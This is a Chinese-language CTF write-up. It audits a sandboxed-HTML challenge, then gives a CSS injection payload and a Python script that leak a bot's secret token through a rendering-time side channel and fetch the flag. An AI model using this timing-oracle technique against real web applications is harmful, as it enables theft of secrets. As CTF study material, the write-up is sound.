# 源碼審計

在index.html發現了CSP

| 指令        | 值              | 安全影響             |
| ----------- | --------------- | -------------------- |
| default-src | 'none'          | 默認禁止所有資源加載 |
| script-src  | 'unsafe-inline' | 允許內聯腳本執行     |
| style-src   | 'unsafe-inline' | 允許內聯樣式         |

還發現直接憑藉了code，

```html
<script>
	document.getElementById('form').onsubmit = e => {
		e.preventDefault();
		const code = document.getElementById('code').value;
		const token = localStorage.getItem('token') ?? '0'.repeat(6);
		const content = `<h1 data-token="${token}">${token}</h1>${code}`;
		document.getElementById('sandbox').srcdoc = content;
	}
</script>
```

測試之後發現確實如此

```js
<h1>test</h1>
```

現在來詳細看看js代碼

```js
import { createServer } from 'http';
import { readFileSync } from 'fs';
import { spawn } from 'child_process'
import { randomInt } from 'crypto';

const sleep = timeout => new Promise(resolve => setTimeout(resolve, timeout));
const wait = child => new Promise(resolve => child.on('exit', resolve));
const index = readFileSync('index.html', 'utf-8');

let token = randomInt(2 ** 24).toString(16).padStart(6, '0');
let browserOpen = false;

const visit = async code => {
	browserOpen = true;
	const proc = spawn('node', ['visit.js', token, code], { detached: true });

	await Promise.race([
		wait(proc),
		sleep(10000)
	]);

	if (proc.exitCode === null) {
		process.kill(-proc.pid);
	}
	browserOpen = false;
}

createServer(async (req, res) => {
	const url = new URL(req.url, 'http://localhost/');
	if (url.pathname === '/') {
		return res.end(index);
	} else if (url.pathname === '/bot') {
		if (browserOpen) return res.end('already open!');
		const code = url.searchParams.get('code');
		if (!code || code.length > 1000) return res.end('no');
		visit(code);
		return res.end('visiting');
	} else if (url.pathname === '/flag') {
		if (url.searchParams.get('token') !== token) {
			res.end('wrong');
			await sleep(1000);
			process.exit(0);
		}
		return res.end(process.env.FLAG ?? 'dice{flag}');
	}
	return res.end();
}).listen(8080);
```

```js
import puppeteer from 'puppeteer';

const browser = await puppeteer.launch({
	pipe: true,
	args: [
		'--no-sandbox',
		'--disable-setuid-sandbox',
		'--js-flags=--noexpose_wasm,--jitless',
		'--incognito'
	],
	dumpio: true,
	headless: 'new'
});

const [token, code] = process.argv.slice(2);

try {
	const page = await browser.newPage();
	await page.goto('http://127.0.0.1:8080');
	await page.evaluate((token, code) => {
		localStorage.setItem('token', token);
		document.getElementById('code').value = code;
	}, token, code);
	await page.click('#submit');
	await page.waitForFrame(frame => frame.name() == 'sandbox', { timeout: 1000 });
	await page.close();
} catch(e) {
	console.error(e);
};

await browser.close();
```

設置的token是6位十六進製的，並且超時時間為10s，那我們可以利用poc來對token進行盲註，但是要知道攻擊路由，抓不到包，仔細看代碼發現就是/bot，注意到说了限制1000个字符，所以可以利用CSS重执行使用 var 函数和自定义属性创建一个很长的字符串，并使用 content 属性显示它。poc為

```js
<style>
h1[data-token^="0"]::after {{
  --a: "AAAAAAAAAA";
  --b: var(--a) var(--a) var(--a) var(--a) var(--a);
  --c: var(--b) var(--b) var(--b) var(--b) var(--b);
  --d: var(--c) var(--c) var(--c) var(--c) var(--c);
  --e: var(--d) var(--d) var(--d) var(--d) var(--d);
  --f: var(--e) var(--e) var(--e) var(--e) var(--e);
  --g: var(--f) var(--f) var(--f) var(--f) var(--f);
  --h: var(--g) var(--g) var(--g) var(--g) var(--g);
  content: var(--h);
  text-shadow: black 1px 1px 50px;
}}
</style>
```

前面說了如果是十秒就超時強製退出，所以睡眠時間不能過久，但是我估計大家都不會寫很久吧

```python
import requests
import time

url = "http://localhost:8080/"

def exploit():
    token = ""
    strings = "0123456789abcdef"  # 优化顺序
    for _ in range(6):
        found = False
        for s in strings:
            css = f'''
            <style>
            h1[data-token^="{token+s}"]::after {{
              --a: "AAAAAAAAAA";
              --b: var(--a) var(--a) var(--a) var(--a) var(--a);
              --c: var(--b) var(--b) var(--b) var(--b) var(--b);
              --d: var(--c) var(--c) var(--c) var(--c) var(--c);
              --e: var(--d) var(--d) var(--d) var(--d) var(--d);
              --f: var(--e) var(--e) var(--e) var(--e) var(--e);
              --g: var(--f) var(--f) var(--f) var(--f) var(--f);
              --h: var(--g) var(--g) var(--g) var(--g) var(--g);
              content: var(--h);
              text-shadow: black 1px 1px 50px;
            }}
            </style>
            '''
            requests.get(url + "bot", params={"code": css})
            # 避免超时
            time.sleep(5)
            r = requests.get(url + "bot")
            if 'already open' in r.text:
                token += s
                print("Current token:", token)
                # 避免服务顶不住
                time.sleep(5)
                found = True
                break
        if not found:
            break
    return token

def get_flag(token):
    r = requests.get(url+"flag", params={"token":token})
    print("Flag:", r.text)

if __name__ == '__main__':
    t = exploit()
    get_flag(t)



```

